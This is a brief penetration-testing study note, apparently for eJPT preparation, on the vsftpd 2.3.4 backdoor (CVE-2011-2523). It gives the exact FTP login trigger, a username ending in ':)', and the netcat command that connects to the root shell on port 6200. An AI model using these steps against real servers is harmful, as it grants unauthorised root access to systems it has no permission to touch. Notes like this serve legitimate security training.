---
type: technique
tags: [ejpt:host-net-pentest]
tools: [netcat, telnet]
cves: [CVE-2011-2523]
related: ["[[cve-2011-2523]]"]
---

# vsftpd Backdoor

The `vsftpd 2.3.4` backdoor ([[cve-2011-2523]]): a malicious source build opens a root shell on port 6200 when triggered.

## Trigger

Connect via FTP and supply a username ending in `:)`:

```
USER anonymous:)
PASS anything
```

Then connect to the backdoor listener:

```sh
nc TARGET 6200
whoami   # root
```

## Seen in

[[first-hacking]], [[tproot]]
